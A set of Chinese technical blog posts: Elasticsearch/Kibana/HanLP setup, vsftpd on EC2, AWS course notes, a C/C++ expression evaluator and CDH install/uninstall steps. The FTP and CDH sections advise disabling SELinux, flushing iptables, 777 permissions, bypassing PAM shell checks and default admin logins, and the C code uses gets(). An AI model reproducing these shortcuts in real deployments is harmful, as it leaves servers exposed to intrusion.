文章大纲Elastic search & kibana & 分词器 安装版本控制下载地址Elastic search安装kibana 安装分词器配置

Elastic search & kibana & 分词器 安装
版本控制
ES版本：7.2.0
分词器版本：
kibana 版本：7.2.0
下载地址
ES 下载地址：https://www.elastic.co/cn/downloads/past-releases/elasticsearch-7-2-0
kibana 下载地址：https://www.elastic.co/cn/downloads/past-releases/kibana-7-2-0
hanlp 分词器下载地址： https://github.com/KennFalcon/elasticsearch-analysis-hanlp 
Elastic search安装

0.添加es 用户，并新建目录

不能以root 方式运行elasticSearch
groupadd elasticsearch 
useradd elasticsearch -g elasticsearch

chown -R elasticsearch:elasticsearch /home/elasticsearch



1.修改 配置文件 elasticsearch.yml

cluster.name: fastclaim
node.name: node-test
network.host: 172.31.3.50
http.port: 9200
cluster.initial_master_nodes: ["node-test"]


2.针对无法创建本地文件问题，用户最大可创建文件数太小


切换到root用户，编辑limits.conf配置文件
vi /etc/security/limits.conf
#末尾添加
* soft nofile 65536
* hard nofile 65536
* soft nproc 65536
* hard nproc 65536


3.针对无法创建本地线程问题，用户最大可创建线程数太小

vi /etc/security/limits.d/90-nproc.conf
将
 * soft nproc 1024
修改为
 * soft nproc 4096
 


4.针对最大虚拟内存太小
解决方法：切换到root用户下，修改配置文件sysctl.conf

vi /etc/sysctl.conf
添加配置
vm.max_map_count=655360
执行命令
sysctl -p


5.重新启动，启动成功

如果要在后台运行，使用./bin/elasticsearch -d启动
curl 172.31.3.50:9200

{
  "name" : "node-test",
  "cluster_name" : "fastclaim",
  "cluster_uuid" : "VtYF-EQIQNKHR1XWk7sE4g",
  "version" : {
    "number" : "7.2.0",
    "build_flavor" : "default",
    "build_type" : "tar",
    "build_hash" : "508c38a",
    "build_date" : "2019-06-20T15:54:18.811730Z",
    "build_snapshot" : false,
    "lucene_version" : "8.0.0",
    "minimum_wire_compatibility_version" : "6.8.0",
    "minimum_index_compatibility_version" : "6.0.0-beta1"
  },
  "tagline" : "You Know, for Search"
}

kibana 安装

1.安装及启动

tar -xzvf 解压缩后，进行安装，
vim config/kibana.yml
# 修改如下四行
server.port: 5601
server.host: "172.31.3.50"
elasticsearch.hosts: ["http://172.31.3.50:9200"]
kibana.index: ".kibana"

# 后台启动

nohup ./bin/kibana >/dev/null &


2.开发工具地址

http://IP:5601/app/kibana#/dev_tools/console?_g=()
分词器配置
参考链接：https://github.com/KennFalcon/elasticsearch-analysis-hanlp

1.下载安装ES对应Plugin Release版本

安装方式：
方式一
a. 下载对应的release安装包，最新release包可从baidu盘下载（链接:https://pan.baidu.com/s/1mFPNJXgiTPzZeqEjH_zifw 密码:i0o7）
b. 执行如下命令安装，其中PATH为插件包绝对路径：
./bin/elasticsearch-plugin install file://${PATH}
方式二
a. 使用elasticsearch插件脚本安装command如下：
./bin/elasticsearch-plugin install https://github.com/KennFalcon/elasticsearch-analysis-hanlp/releases/download/v7.2.0/elasticsearch-analysis-hanlp-7.2.0.zip

2.安装数据包
release包中存放的为HanLP源码中默认的分词数据，若要下载完整版数据包，请查看HanLP Release。
数据包目录：ES_HOME/plugins/analysis-hanlp
注：因原版数据包自定义词典部分文件名为中文，这里的hanlp.properties中已修改为英文，请对应修改文件名
hanlp.properties 在
/home/elasticsearch/elasticsearch-7.2.0/config/analysis-hanlp 目录中

因为aws ec2 里面网络环境比较好，推荐直接在线安装。

3.重启Elasticsearch

注：上述说明中的ES_HOME为自己的ES安装路径，需要绝对路径

4.配置自定义词典并热更新

在本版本中，增加了词典热更新，修改步骤如下：

a. 在ES_HOME/plugins/analysis-hanlp/data/dictionary/custom目录中新增自定义词典
b. 修改hanlp.properties，修改CustomDictionaryPath，增加自定义词典配置
c. 等待1分钟后，词典自动加载

具体脚本，以医学常用词典medical.txt 为例
mv /tmp/medical.txt /home/elasticsearch/

cp /home/elasticsearch/medical.txt /home/elasticsearch/elasticsearch-7.2.0/plugins/analysis-hanlp/data/dictionary/custom/

#移动完成后修改权限

chown -R elasticsearch:elasticsearch /home/elasticsearch/


ll /home/elasticsearch/elasticsearch-7.2.0/plugins/analysis-hanlp/data/dictionary/custom/

#修改添加自定义目录

vim /home/elasticsearch/elasticsearch-7.2.0/config/analysis-hanlp/hanlp.properties

# Custom dictinary path
CustomDictionaryPath=data/dictionary/custom/CustomDictionary.txt; ModernChineseSupplementaryWord.txt; ChinesePlaceName.txt ns; PersonalName.txt; OrganizationName.txt; ShanghaiPlaceName.txt ns;data/dictionary/person/nrf.txt nrf; medical.txt;

注：每个节点都需要做上述更改

5.提供的分词方式说明

hanlp: hanlp默认分词
hanlp_standard: 标准分词
hanlp_index: 索引分词
hanlp_nlp: NLP分词
hanlp_n_short: N-最短路分词
hanlp_dijkstra: 最短路分词
hanlp_crf: CRF分词（已有最新方式）
hanlp_speed: 极速词典分词

6.分词样例

GET /_analyze?pretty
{
  "analyzer" : "hanlp_crf",
  "text" : ["南京市长江大桥"]
}
{
  "tokens" : [
    {
      "token" : "南京市",
      "start_offset" : 0,
      "end_offset" : 3,
      "type" : "ns",
      "position" : 0
    },
    {
      "token" : "长江大桥",
      "start_offset" : 0,
      "end_offset" : 4,
      "type" : "nz",
      "position" : 1
    }
  ]
}











文章大纲ssh登录设置并安装vsftp使用本地用户模式 配置vsftp conf编辑允许访问ftp服务器的用户列表：非受限用户启动ftp服务ec2 权限设置客户端安装与说明报错处理530 Login incorrect. Login failed.参考文献

ssh登录
pem 文件下载：
从aws 下载pem 文件
使用ssh登录

ssh -i "xxx.pem" ec2-user@ec2-xxx.cn-north-1.compute.amazonaws.com.cn



设置并安装vsftp
sudo yum install vsftpd

useradd -d /dir username 

sudo passwd username

sudo chmod 777 /dir/upload/ -R

#限制用户仅能通过 FTP 访问
#限制用户 ftpuser只能通过 FTP 访问服务器，而不能直接登录服务器：
sudo usermod -s /sbin/nologin username

#设置为用户的主目录：
sudo usermod -d /data/ username


#开放ftp 21 端口 或者 关闭防火墙
#关闭SELinux服务
setenforce 0
#关闭防火墙
iptables -F



使用本地用户模式 配置vsftp conf
修改vsftpd配置文件：

sudo vi /etc/vsftpd/vsftpd.conf  

修改后的内容如下：

# Allow anonymous FTP? (Beware - allowed by default if you comment this out).
anonymous_enable=NO
#
# Uncomment this to allow local users to log in.
# When SELinux is enforcing check for SE bool ftp_home_dir
local_enable=YES
local_root=/your_dir
#
# Uncomment this to enable any form of FTP write command.
write_enable=YES
#
# Default umask for local users is 077. You may wish to change this to 022,
# if your users expect that (022 is used by most other ftpd's)
local_umask=022
#

# Activate directory messages - messages given to remote users when they
# go into a certain directory.
dirmessage_enable=YES
#
# Activate logging of uploads/downloads.
xferlog_enable=YES
#
# Make sure PORT transfer connections originate from port 20 (ftp-data).
connect_from_port_20=YES
#

# If you want, you can have your log file in standard ftpd xferlog format.
# Note that the default log file location is /var/log/xferlog in this case.
xferlog_std_format=YES
#

# You may specify an explicit list of local users to chroot() to their home
# directory. If chroot_local_user is YES, then this list becomes a list of
# users to NOT chroot().
# (Warning! chroot'ing can be very dangerous. If using chroot, make sure that
# the user does not have write access to the top level directory within the
# chroot)
chroot_local_user=YES
chroot_list_enable=YES
# (default follows)
chroot_list_file=/etc/vsftpd/chroot_list
#
# You may activate the "-R" option to the builtin ls. This is disabled by
# default to avoid remote users being able to cause excessive I/O on large
# sites. However, some broken FTP clients such as "ncftp" and "mirror" assume
# the presence of the "-R" option, so there is a strong case for enabling it.
ls_recurse_enable=YES
#
# When "listen" directive is enabled, vsftpd runs in standalone mode and
# listens on IPv4 sockets. This directive cannot be used in conjunction
# with the listen_ipv6 directive.
listen=YES
#

# Make sure, that one of the listen options is commented !!
#listen_ipv6=YES

pam_service_name=vsftpd
userlist_enable=YES
tcp_wrappers=YES

#############
userlist_deny=NO
userlist_file=/etc/vsftpd/user_list

##vsftpd.chroot_list需要手动建立
##允许文本模式下载
ascii_download_enable=YES
##允许文本模式上传
ascii_upload_enable=YES


##启用被动模式
pasv_enable=YES
pasv_promiscuous=YES
pasv_min_port=60000
pasv_max_port=60020


由于该配置使用了被动模式，所以需要在linux防火墙配置中，开放路由器转发端口

sudo iptables -A INPUT -p tcp --dport 60000:60020 -j ACCEPT


编辑允许访问ftp服务器的用户列表：
sudo vi /etc/vsftpd/user_list  

把不需要的注释掉，最后加上一行ftpUserName
非受限用户
凡是加在文件vsftpd/chroot_list中的用户都是不受限止的用户,即, 可以浏览其主目录的上级目录。在这里默认为空：
sudo vi /etc/vsftpd/chroot_list 

直接保存退出
启动ftp服务
sudo service vsftpd start  

ec2 权限设置
最后，需要在EC2控制台中设置Security Group，增加ftp所需端口
20，21以及60000-60020

客户端安装与说明
https://filezilla-project.org/
推荐使用FileZilla，并设置为被动模式
如果出现如下错误：
ftp> ls
200 PORT command successful. Consider using PASV.
425 Failed to establish connection.
ftp> put
(local-file) iz_
usage: put local-file remote-file
ftp> put
(local-file) test.txt
(remote-file) test.txt
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
425 Failed to establish connection.
ftp> bye
421 Timeout.

有可能是windows 本地防火墙的问题，可以关闭防火墙
或者首先使用被动模式
quote PASV
解决问题的思路如下：
1、防火墙（本机、客户机）
2、FTP目录的权限
3、客户机是否是IPv6网络
4、客户机的网关限制了外网ftp

报错处理
530 Login incorrect. Login failed.
在客户端登录vsftpd时报530 login incorret 错误，发现是PAM鉴权造成的，解决方法如下：
方法（1）：注释掉/etc/pam.d/vsftpd文件里这后一行：
auth    required        pam_shells.so，这样不去鉴权
方法（2）：在/etc/shells文件里面增加一行：
/sbin/nologin,这样允许不能登录系统的用户通过鉴权
按照方法（1）操作

#备份：

cp /etc/pam.d/vsftpd /etc/pam.d/vsftpd.bak

#修改：

vim /etc/pam.d/vsftpd

#注释掉以下这一行：

#auth   required        pam_shells.so

#然后再次登陆，就可以了。



参考文献
userlist_enable和userlist_deny两个配置项的解释
Linux_vsftpd服务安装及配置（三种登陆方式）










文章大纲Aws 的优势架构完善的框架（WAF）

Aws 学习笔记
Aws架构中心
Aws 的优势
4.速度优势
5.全球优势
数分钟内实现全球部署
Aws全球基础设施
Aws 数据中心
来自多家ODM（白牌机器）
1.考虑当地法律法律法规
2.考虑速度，和用户的距离，是否提供对应的业务
3.考虑成本
Aws 可用区
每个区由一个或者多个数据中心组成
专为故障隔离而设计
使用高速专用链接与其他可用区域互联
您可以选择可用区
Aws建议跨可用区复制以便实现弹性。
Aws 边缘站点协助客户实现高可用、高响应
架构完善的框架（WAF）
5大支柱：
1.安全性
2.可靠性
3.成本优化
4.性能效率
5.卓越运维
安全性
身份机制
实现可追踪性
在所有层确保安全性
风险评估与缓解策略
可靠性
动态获取计算资源以满足要求
成本优化
衡量效率
消除不必要的支出
考虑使用托管服务
卓越运维
能够运行和监控各种系统
持续改进支持流程和程序
部署方式
更新方式
操作方式
性能效率
选择有效的资源并在需求变化时保持资源效率
普及先进技术
了解技术


20191017 下午课程 aws 简单架构
Aws s3
Amazon s3 对象存储（扁平化，对象，元数据）
设计为提供99.999999999%的持久性（9个九+2个九= 11个九）
事件触发器
静态网站托管
S3访问控制
S3 使用案例
计算和大规模分析的的数据存储
限制：上传5G，存放5T
版本控制
备份工具
Aws Glacier
右上角换成amazon s3 智能分层
EC2 添加计算功能
使用amazon 系统镜像AMI 启动 Amazon EC2 实例
自定义启动配置的相关组件
EC2 和数据存储
EBS 弹性实例存储
实例存储是临时性的
跨可用区的数据复制要收钱，快照是可以复制。
跨可用区复制。
先对卷做快照-实际上是在s3上面，在另一个可用区用快照恢复
用户数据及实例元数据
https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
EC2 实例类型
EC2定价选项
会话处理放在外部，ec2只是一个计算的模块。
架构一定是无状态的。
EMR按需结合竞价来做.任务可以提前完成而且成本更低。
标签最佳实践
添加数据库层
选择什么样的数据更适合什么样的场景
数据库层的选择注意事项
关系型与非关系型数据库对比
Oracle 大部分扩展是用垂直扩展，mysql 支持水平扩展
事务查询用关系型数据库。
Nosql 天生支持水平扩展形式
amazon aurora
老师强烈推荐了 amazon aurora 是自己提升了性能，并开始将自身的Oracle逐渐下线改为amazon aurora
Amazon DynamoDB
以购买火车票场景为例
查看余票：最终一致性
下单：强一致性
为什么有这两个区别：
CAP原则又称CAP定理，指的是在一个分布式系统中，一致性（Consistency）、可用性（Availability）、分区容错性（Partition tolerance）。CAP 原则指的是，这三个要素最多只能同时实现两点，不可能三者兼顾。
数据库的安全管理
RDS
DynamoDB
数据库的迁移

20191018 早上课程 网络
云中的安全性
链接网络
虚拟私有网络
VGW需要购买
Aws Direct Connect
多个vpc 互联互通

20191018 下午课程
AWS 负载均衡器
高可用
多区域高可用及DNS
Aws Identity and access management
弹性高可用和监控
弹性
高可用
监控
CloudWatch
获得弹性并扩展架构

20191019 上午课程
实现基础设施自动化
Aws CloudFormation
可以直接托拉拽的设计方式
快速入门由AWS 解决方案架构师和合作伙伴编写,旨在依据安全性和高可用性 方面的AWS 最佳实践,帮助您部署基于AWS 的热门解决方案。这些参考部署可在AWS 云上自动实施关键技术,通常只需单击一下即可在一小时内完成实施。 您可以通过简单几步构建测试或生产环境,然后便可立即开始使用。 (AWS)
Aws system manager
AWS Systems Manager 是一项管理服务,可帮助您自动收集软件清单、应用操作 系统修补程序、创建系统映像并配置Windows 和 Linux 操作系统。这些功能可 帮助您定义和跟踪系统配置,防止偏差,并确保Amazon EC2 和本地配置的软件 合规性。AWS Systems Manager 提供的管理方法是根据云的规模和敏捷性专门设 计的,可以扩展到您的本地数据中心,使您可以更轻松地将现有基础设施与 AWS 进行无缝桥接。
Aws Opsworks
缓存
Aws cloudfront
构建解耦架构
传统基础设施以紧密集成的服务器链为中心,其中每个服务器都有特定的目的。 然而,当其中一个组件/层发生故障时,就会对系统的造成灾难性的破坏。此外, 它这种情况也妨碍了扩展。如果在一个层添加或删除服务器,则每个连接层上 的每个服务器也必须相应地进行连接 (AWS)
Aws SQS
引入 SQS 队列有助于改进您的订购应用程序。您可以使用队列将处理逻辑隔离 到其组件中,并在一个独立于Web 应用程序的进程中运行它。这反过来又让系 统能够更灵活地应对流量峰值,同时支持系统仅在必要时快速执行工作以便管 理成本。此外,这还为您提供了一种机制,让您可以将订单作为消息持久保存 (队列充当临时数据库),并将您的事务范围与数据库向堆栈更下层移动。如 果发生应用程序异常或事务失败,这可以确保将订单处理停用或重定向到 Amazon SQS 死信队列 (DLQ),以便日后进行重新处理。 (AWS)
Amazon Simple Queue Service (Amazon SQS) 是一种分布式队列系统,它使Web 服务应用程序能够对应用程序中的一个组件生成的消息(以供另一个组件使用) 进行排队。队列是一个临时存储库,用于存储等待处理的消息,并将消息保留 1 到 14 天(默认为 4 天)。使用Amazon SQS,您可以将应用程序的组件解耦,以 便它们独立运行。消息可包含最多 256KB 的任何格式的文本。Amazon SQS 支持 多个生产者和使用者与同一队列进行交互。Amazon SQS 可与多种AWS 产品一起 使用,包括:Amazon EC2、Amazon S3、Amazon ECS、AWS Lambda 和Amazon DynamoDB。
Amazon SQS 提供了两种类型的消息队列。标准队列提供最大吞吐量、尽力排序 和至少一次传递。Amazon SQS FIFO 队列旨在保证消息严格按照其发送顺序仅处 理一次,吞吐量有限。以下情景描述了Amazon SQS 队列中消息的生命周期(从 创建到删除)。在这个情景中,有一个生产者向队列发送了一条消息,消息以 冗余方式跨Amazon SQS 服务器分布。 (AWS)
Amazon SNS
Amazon Simple Notification Service (SNS) 是一种Web 服务,让用户可以轻松地在 云中设置、操作和发送通知。该服务遵循“发布 – 订阅”(pub-sub)消息收发范 例,使用“推送”机制将通知传递给客户端。
您可以创建一个主题,然后定义策略来确定哪些发布者和订阅者可以与其进行 通信,从而控制对该主题的访问。发布者可以向他们创建的主题或他们发布权 限的主题发送消息。发布者不需要在每条消息中包含特定的目标地址,只需将 消息发送至主题。然后,Amazon SNS 会将主题与该主题的订阅者列表进行匹配, 并将消息传递给每个订阅者。每个主题都有一个唯一的名称,为发布者和订阅 者标识Amazon SNS 终端节点,以便他们发布消息和订阅注册通知。订阅者会收 到发布至他们所订阅主题的所有消息,且一个主题的所有订阅者收到的消息都 相同。
Amazon SNS 支持加密主题。当您将消息发送至加密主题时,Amazon SNS 会使用 由AWS KMS (https://aws.amazon.com/kms/) 提供支持的客户主密钥 (CMK) 来加密 您的消息。Amazon SNS 支持客户托管的 CMK,也支持AWS 托管的 CMK。只要 收到您的消息,Amazon SNS 便在服务器上使用 256 位AES-GCM 算法进行加密。 为实现持久性,这些消息以加密形式存储在多个可用区 (AZ) 中,并在传输到订 阅终端节点(例如,Amazon Simple Queue Service [Amazon SQS] 队列、AWS
Lambda 函数,以及HTTP 和HTTPS Webhook)之前解密。 (AWS)
上述两个组件的消息的延迟性比较大，而kinesis 的处理主要是针对近实时性的。
kinesis stream 相当于管道。
Kinesis firehouse 进行转发转接，kinesis 转发到另外的组件进行集成展示业务。
Kinesis 是一整套系统，kafka 只是数据接下来存好。
20191019 下午课程
微服务和无服务架构
Amazon ECS
Amazon Elastic Container Service (Amazon ECS) 是一种高度可扩展的高性能容器管 理服务,其支持Docker 容器,让您能够在托管的Amazon EC2 实例集群上轻松 运行应用程序。
Amazon ECS 是一种可扩展的集群服务,用于托管容器,可以: • 扩展到数千个实例 • 监控容器的部署 • 管理集群的完整状态 • 使用内置的计划程序或第三方计划程序(例如 Apache Mesos、Blox)对容器 进行计划
• 使用API 来扩展 群集可以使用 Spot 实例和预留实例 (AWS)
无服务架构
Aws api Gateway
防止暴露终端节点
防护DDos 攻击和注入攻击
灾难预防
存储备份
计算备份
恢复策略
参考资料
EMR 弹性扩展
https://aws.amazon.com/cn/blogs/big-data/best-practices-for-resizing-and-automatic-scaling-in-amazon-emr/
https://docs.aws.amazon.com/zh_cn/emr/latest/ManagementGuide/emr-automatic-scaling.html







表达式求值
[问题描述]
一个算术表达式是由操作数(operand)、运算符(operator)和界限符(delimiter)组成的。假设操作数是正整数，运算符只含加减乘除等四种运算符，界限符有左右括号和表达式起始、结束符“#”，如：#（7+15）*（23-28/4）#。引入表达式起始、结束符是为了方便。编程利用“算符优先法”求算术表达式的值。
[基本要求]
（1） 从键盘读入一个合法的算术表达式，输出正确的结果。
（2） 显示输入序列和栈的变化过程。
[选作内容]
（1） 扩充运算符集合。
（2） 引入变量操作数。
（3） 操作数类型扩充到实数。
 
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <math.h>
#include <conio.h>

#define TRUE 1
#define FALSE 0
#define Stack_Size 50

char ops[7]={'+','-','*','/','(',')','#'};  /*运算符数组*/

int  cmp[7][7]={{2,2,1,1,1,2,2},    /*用来进行比较运算符优先级的矩阵,3代表'=',2代表'>',1代表'<',0代表不可比*/
                {2,2,1,1,1,2,2},
                {2,2,2,2,1,2,2},
                {2,2,2,2,1,2,2},
                {1,1,1,1,1,3,0},
                {2,2,2,2,0,2,2},
                {1,1,1,1,1,0,3}};

typedef struct
{ 
	char elem[Stack_Size];
	int top;
}SeqStack;     /*运算符栈的定义*/

typedef struct
{
	int elem[Stack_Size];
	int top;
}nSeqStack;   /* 运算数栈的定义*/


void InitStack(SeqStack *S)   /*初始化运算符栈*/
{
	S->top =-1;
}

void InitStackn(nSeqStack *S)   /*初始化运算数栈*/
{
	S->top =-1;
}

int IsEmpty(SeqStack *S)    /*判断栈S为空栈时返回值为真，反之为假*/
{
	return(S->top==-1?TRUE:FALSE);
}

int IsEmptyn(nSeqStack *S)    /*判断栈S为空栈时返回值为真，反之为假*/
{
	return(S->top==-1?TRUE:FALSE);
}

/*判栈满*/
int IsFull(SeqStack *S)	    /*判断栈S为满栈时返回值为真，反之为假*/
{
	return(S->top==Stack_Size-1?TRUE:FALSE);
}

int IsFulln(nSeqStack *S)	    /*判断栈S为满栈时返回值为真，反之为假*/
{
	return(S->top==Stack_Size-1?TRUE:FALSE);
}

int Push(SeqStack *S, char x)   /*运算符栈入栈函数*/
{
	if (S->top==Stack_Size-1)
	{
		printf("Stack is full!\n");
		return FALSE;
	}
	else
	{
		S->top++;
		S->elem[S->top]=x;
		return TRUE;
	}
}

int Pushn(nSeqStack *S, int x)   /*运算数栈入栈函数*/
{
	if (S->top==Stack_Size-1)
	{
		printf("Stack is full!\n");
		return FALSE;
	}
	else
	{
		S->top++;
		S->elem[S->top]=x;
		return TRUE;
	}
}
 
int Pop(SeqStack *S, char *x)    /*运算符栈出栈函数*/
{
	if (S->top==-1)
	{
		printf("运算符栈空!\n");
		return FALSE;
	}
	else
	{
		*x=S->elem[S->top];
		S->top--;
		return TRUE;
	}
}
 
int Popn(nSeqStack *S, int *x)    /*运算数栈出栈函数*/
{
	if (S->top==-1)
	{
		printf("运算符栈空!\n");
		return FALSE;
	}
	else
	{
		*x=S->elem[S->top];
		S->top--;
		return TRUE;
	}
}

char GetTop(SeqStack *S)    /*运算符栈取栈顶元素函数*/     
{
	if (S->top ==-1)
	{
		printf("运算符栈为空!\n");
		return FALSE;
	}
	else
	{
		return (S->elem[S->top]);
	}
}

int GetTopn(nSeqStack *S)    /*运算数栈取栈顶元素函数*/     
{
	if (S->top ==-1)
	{
		printf("运算符栈为空!\n");
		return FALSE;
	}
	else
	{
		return (S->elem[S->top]);
	}
}


int Isoperator(char ch)        /*判断输入字符是否为运算符函数,是返回TRUE,不是返回FALSE*/
{
	int i;
	for (i=0;i<7;i++)
	{
		if(ch==ops[i])
			return TRUE;
	}
	return FALSE;
}

/*
int isvariable(char ch)
{ if (ch>='a'&&ch<='z')
      return true;
   else 
	   return false;
}*/


char Compare(char ch1, char ch2)   /*比较运算符优先级函数*/
{
	int i,m,n;
	char pri;
	int priority;
	for(i=0;i<7;i++)              /*找到相比较的两个运算符在比较矩阵里的相对位置*/
	{
		if(ch1==ops[i])	
			m=i;
		if (ch2==ops[i])
			n=i;
	}

	priority = cmp[m][n];
	switch(priority)
	{
	case 1:
		pri='<';
		break;
	case 2:
		pri='>';
		break;
	case 3:
		pri='=';
		break;
	case 0:
		pri='$';
		printf("表达式错误!\n");
		break;
	}
	return pri;
}
	
int Execute(int a, char op, int b)    /*运算函数*/
{
	int result;
	switch(op)
	{
	case '+':
		result=a+b;
		break;
	case '-':
		result=a-b;
		break;
	case '*':
		result=a*b;
		break;
	case '/':
		result=a/b;
		break;
	}
    return result;
}

int ExpEvaluation() 
/*读入一个简单算术表达式并计算其值。optr和operand分别为运算符栈和运算数栈，OPS为运算符集合*/
{
	int a,b,v,temp;
	char ch,op;
	char *str;
	int i=0;
	
	SeqStack optr;
	nSeqStack operand;

	InitStack(&optr);
	InitStackn(&operand);
	Push(&optr,'#');
	printf("请输入表达式(以#结束):\n");            /*表达式输入*/
	str =(char *)malloc(50*sizeof(char));
	gets(str);

	ch=str[i];
	i++;
	while(ch!='#'||GetTop(&optr)!='#')
	{ 
		if(!Isoperator(ch))
		{
			temp=ch-'0';    /*将字符转换为十进制数*/
			ch=str[i];
			i++;
			while(!Isoperator(ch))
			{
				temp=temp*10 + ch-'0'; /*将逐个读入运算数的各位转化为十进制数*/
				ch=str[i];
				i++;
			}
			Pushn(&operand,temp);
		}
		else
		{
			switch(Compare(GetTop(&optr),ch))
			{
			case '<':
				Push(&optr,ch); 
				ch=str[i];
				i++;
				break;
			case '=':
				Pop(&optr,&op);
				ch=str[i];
				i++;
				break;
			case '>':
				Pop(&optr,&op);
				Popn(&operand,&b);
				Popn(&operand,&a);
				v=Execute(a,op,b);  /* 对a和b进行op运算 */
				Pushn(&operand,v);
				break;
			}
		}		
	}
	v=GetTopn(&operand);
	return v;
}

void main()                               /*主函数*/
{
	int result;
	result=ExpEvaluation();
	printf("\n表达式结果是%d\n",result);
}	








 
 
下面这个是在网上找的：
用 C++ 实现的加、减、乘、除表达式计算

前些日子面试一个开发工作，考官出了这么一笔试题目，要我写出实现过程， 思量半天，终于
用 C++ 完成，现将代码贴出，与诸同道共分享。

// 头文件 Calc.h
#ifndef __CALC_H__
#define __CALC_H__
#include <stack>
#define ascii_int(x) (x >= 0x30 && x <= 0x39) ? (x - 0x30) : (x)
const int GREATER =  1;
const int EQUAL   =  0;
const int LESS    = -1;
class Calculate {
public:
  int  evaluteExpr(char *exp);
private:
  int  getLevel(char ch);
  bool isOperator(char ch);
  int  compareOpteratorLevel(char inputChar, char optrStackTop);
  int  calc(int num1, int num2, char op);
  void evaluate(char ch);
private:
  std::stack<int>  _opnd_stack;
  std::stack<char> _optr_stack;
  static char _optr[];
  static int  _level[];
};
#endif


// 头文件的实现代码 Calc.cxx
#include "Calc.h"
char Calculate::_optr[] = {'#', '(', '+', '-', '*', '/', ')'};
int Calculate::_level[] = { 0,   1,   2,   2,   3,   3,   4 };
// Get current operator level for calculating
int Calculate::getLevel(char ch) {
  for (int i = 0; *(_optr+i) != '\0'; ++i) 
    if (*(_optr+i) == ch) 
      return *(_level+i);
}
// Calculate the operands
int Calculate::calc(int num1, int num2, char op) {
  switch (op) 
    {
    case '+':
      return num1 + num2;
    case '-':
      return num1 - num2;
    case '*':
      return num1 * num2;
    case '/':
      return num1 / num2;
    }
}
// judge inputing character is operator or not
bool Calculate::isOperator(char ch) {
  for (char *p = _optr; *p != '\0'; ++p)
    if (*p == ch) 
      return true;
  return false;
}
// Compare level of input operator and the top operator of operator stack
int Calculate::compareOpteratorLevel(char inputChar, char optrStackTop) {
//   if (inputChar == '(' && optrStackTop == ')') 
//     return EQUAL;
//   else 
  if (inputChar == '(')
    return GREATER;
  if (inputChar == ')' && optrStackTop == '(') 
    return EQUAL;
  else if (inputChar == ')') 
    return LESS;
  if (inputChar == '#' && optrStackTop == '#') 
    return EQUAL;
//   else if (inputChar == '#')
//     return LESS;
  return (getLevel(inputChar) > getLevel(optrStackTop)) ? GREATER : LESS;
}
// Evaluate value while inputing operators
void Calculate::evaluate(char ch) {
  char op;
  int num, result;
  if (!isOperator(ch)) {
    _opnd_stack.push(ascii_int(ch));
    return ;
  }
  switch (compareOpteratorLevel(ch, _optr_stack.top())) 
    {
    case GREATER :
      _optr_stack.push(ch);
      break;
    case EQUAL :
      _optr_stack.pop();
      break;
    case LESS :
      num = _opnd_stack.top();
      _opnd_stack.pop();
      result = _opnd_stack.top();
      _opnd_stack.pop();
      op = _optr_stack.top();
      _optr_stack.pop();
      result = calc(result, num, op);
      _opnd_stack.push(result);
      evaluate(ch);
      break;
    }
}
// Evaluate user specified expression
int Calculate::evaluteExpr(char *exp) {
  _optr_stack.push('#');
  for (char *p =exp; *p != '\0'; ++p )
    evaluate(*p);
  int result = _opnd_stack.top();
  _opnd_stack.pop();
  return result;
}


// 测试代码 calc_test.cxx
#include <iostream>
#include "Calc.h"
using namespace std;
int main(void) {
  Calculate *calc = new Calculate();
  cout << "1+3*(4+7) = " 
       << calc->evaluteExpr("1+3*(4+7)#") 
       << endl;
  cout << "((1+2)) = " 
       << calc->evaluteExpr("((1+2))#") 
       << endl;
  cout << "3*8+9/7-5-9+(1-9)/4 = " 
       << calc->evaluteExpr("3*8+9/7-5-9+(1-9)/4#") 
       << endl;
  cout << "(6-7)*(5+9) = " 
       << calc->evaluteExpr("(6-7)*(5+9)#") 
       << endl;
  cout << "0*8+0/6-9+(7-1) = " 
       << calc->evaluteExpr("0*8+0/6-9+(7-1)#") 
       << endl;
  delete calc;
}

用 MinGW/G++ 3.4.5 编译如下: 
  g++  -o test.exe  Calc.cxx  Calc_test.cxx

作为一个演示算法够了， 但代码还是有一些缺点:
   (1) 只能处理一位数的加、减、乘、除表达式计算(可带括号)

 









上次写了CDH安装测试总结，由于那个博客篇幅略长， 但是主要集中在第二章，所以单独把CDH安装、卸载这块的内容拉出来在一篇记录一下。
一．搭建远程yum源
1.启动http服务：

service httpd start

2.挂载镜像文件rhel6.6.iso到/var/www/html下的任意文件夹

mount -o loop /RHEL-6.6Server.iso /var/www/html/rhel66

3.cd 到/etc/yum.repos.d 目录下，先把已有的repo做备份，并建立以”.repo”结尾的文件，这里我建立的是rhel66.repo，内容如下：

[rhel66] 
  name=rhel66 
  baseurl=http://serverIP/rhel66 
  enabled=1 
  gpgcheck = 0 
  #gpgkey = http://yourIP/rhel65/RPM-GPG-KEY-redhat-release

4.配置完成后用命令：

yum clean all 进行刷新 
  yum makecache

5.输入yum install httpd，打开浏览器，输入ip/rhel66 验证是否成功
二．准备CDH安装包
1.开启apache服务：

service httpd start

2.将已有的cloudera安装包和文件

CDH-5.8.0-1.cdh5.8.0.p0.42-el6.parcel， 
  CDH-5.8.0-1.cdh5.8.0.p0.42-el6.parcel.sha1， 
  manifest.json移到/var/www/html目录下，权限均为777，用户为root。

三. 安装cloudera

将cloudera-manager-installer.bin文件修改成可执行权限，在/var/www/html里执行cloudera-manager-installer.bin文件，开始安装
登录网址： ip:7180，用户，密码为admin
填写主机名 

集群存储库，使用parcel,选择更多选项，将其中https改为http，多余url删除，只保留第一个，{latest_support}删除  
 

选择自定义存储库，将示例的网址复制粘贴，把https改为http 

点击安装Oracle Java SE开发工具包(JDK)，点击继续按钮

输入所有主机的root密码，确定后点击继续

自定义选择安装的服务

安装其他内容，不详细的请参考上一篇： 
CDH安装测试总结
四．卸载CDH
CDH5.X，完全卸载步骤步骤如下：
1.关闭集群中的所有服务。
通过clouder manger 主页关闭集群。
2.卸载

[root@master ~]# /usr/share/cmf/uninstall-cloudera-manager.sh 
[root@slave1 ~]# service cloudera-scm-agent stop 
  [root@slave1 ~]# service cloudera-scm-agent stop

以下都是所有要卸载的集群均要执行清除工作：

[root@master ~]# umount /var/run/cloudera-scm-agent/process 
  [root@slave1 ~]# umount /var/run/cloudera-scm-agent/process 
  [root@slave2 ~]# umount /var/run/cloudera-scm-agent/process
